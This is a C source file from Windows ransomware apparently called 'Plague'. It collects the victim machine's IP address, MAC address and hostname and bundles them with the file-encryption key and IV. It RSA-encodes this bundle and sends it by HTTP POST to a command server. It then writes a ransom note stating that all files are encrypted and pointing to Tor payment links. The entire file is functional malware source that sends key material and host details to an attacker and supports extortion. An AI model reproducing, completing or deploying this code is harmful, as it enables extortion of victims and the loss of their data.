
#include "includes/plague.h"

void error(const char *msg)
{
    perror(msg);
    exit(0);
}

void get_network_info(char **ip, char **mac)
{
    PIP_ADAPTER_INFO pAdapterInfo;
    PIP_ADAPTER_INFO pAdapter = NULL;
    DWORD dwRetVal = 0;
    ULONG ulOutBufLen = sizeof (IP_ADAPTER_INFO);

    if (!(*mac = malloc(sizeof(char) * 18)))
        return ;
    pAdapterInfo = (IP_ADAPTER_INFO *) malloc(sizeof (IP_ADAPTER_INFO));
    if (pAdapterInfo == NULL)
        return ;
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW)
    {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO *) malloc(ulOutBufLen);
        if (pAdapterInfo == NULL)
        {
            free(*mac);
            return ;
        }
    }
    if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR)
    {
        pAdapter = pAdapterInfo;
        while (pAdapter)
        {
            if (pAdapter->AddressLength >= 6)
            {
                sprintf(*mac, "%02X:%02X:%02X:%02X:%02X:%02X",
                        pAdapter->Address[0], pAdapter->Address[1],
                        pAdapter->Address[2], pAdapter->Address[3],
                        pAdapter->Address[4], pAdapter->Address[5]);
            }
            else
            {
                free(*mac);
                mac = NULL;
            }
            *ip = strdup(pAdapter->IpAddressList.IpAddress.String);
            pAdapter = pAdapter->Next;
        }
    }
    if (pAdapterInfo)
        free(pAdapterInfo);
}

char *get_hostname()
{
    DWORD  BUF_SIZE = 1024;
    TCHAR  infoBuf[BUF_SIZE];

    GetComputerName( infoBuf, &BUF_SIZE);
    return strdup(infoBuf);
}

void write_readme(char *id)
{
    FILE *fp;
    fp = fopen("README-PLAGUE.txt","w+");
    fprintf(fp, "All your files are encrypted.\n");
    fprintf(fp, "Go to one of those link to know how to get your data recovered :\n");
    fprintf(fp, "- http://%s.sh/?id=%s\n\n", SRV_ADDR, id);
    fprintf(fp, "- http://%s.tor2web/?id=%s\n\n", SRV_ADDR, id);
    fprintf(fp, "If links are not available, follow this steps :\n");
    fprintf(fp, "- Download and install TOR browser (on this link : https://www.torproject.org/download/).\n");
    fprintf(fp, "- Run the TOR browser.\n");
    fprintf(fp, "- Tape in the address bar : http://%s/?id=%s\n", SRV_ADDR, id);
    fprintf(fp, "- Follow the instruction on the site.\n");
    fclose(fp);
}

char *send_request(char *message)
{
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char *response;
    int recv_size;
    char *host = SRV_ADDR;
    int port = 80;

    if (!(response = malloc(sizeof(char) * RESPONSE_SIZE)))
        exit(0);
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0)
        return NULL;

    //Create a socket
    if((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
        printf("Could not create socket : %d", WSAGetLastError());

    server.sin_addr.s_addr = inet_addr(host);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    //Connect to remote server
    if (connect(s , (struct sockaddr *)&server , sizeof(server)) < 0)
        return NULL;

    //Send some data
    if( send(s , message , strlen(message) , 0) < 0)
        return NULL;

    //Receive a reply from the server
    if((recv_size = recv(s, response, 2000 ,0)) == SOCKET_ERROR)
        puts("recv failed");
    response[recv_size] = '\0';
    return response;
}

int send_key(char *key, char *iv)
{
    char json[1024], message[4096];
    char *response;
    char *priv_ip, *mac;
    size_t len = 0;
    unsigned char *data;
    char *request = "POST / HTTP/1.1\r\n"
                    "Host: %s\r\n"
                    "Content-Type:  application/x-www-form-urlencoded\r\n"
                    "Content-Length: %d\r\n\r\n"
                    "data=%s";
    char *format = "{\"key\":\"%s\",\"iv\":\"%s\",\"PrivateIP\":\"%s\",\"mac\":\"%s\",\"hostname\":\"%s\"}";
    char *encoded;
    int ret = 0;

    get_network_info(&priv_ip, &mac);

    /* fill in the parameters */
    sprintf(json, format, key, iv, priv_ip, mac, get_hostname());

    // encode data
    data = rsa_encode((unsigned char *)json, &len); //encode

    // encoded = base64_encode(data, len, &len);
    encoded = bin2hex(data, len);

    // printf("b64 data    : %s\n", encoded);
    sprintf(message, request, SRV_ADDR, strlen("data=") + strlen((char *)encoded), encoded);
    printf("message : %s\n", message);
    system("PAUSE");

    response = send_request(message);
    printf("response : %s\n", response);
    system("PAUSE");

    /* process response */
    char *id = strstr(response, "id:");
    char *check = strstr(response, "check:");
    if (!id)
        return 0;
    id = strtok(id, " \n");
    if (check)
        check = strtok(check, " \n");
    if (strstr(check, "TRUE") != NULL)
        ret = 1;
    write_readme(&id[3]);
    if (response)
        free(response);
    return ret;
}
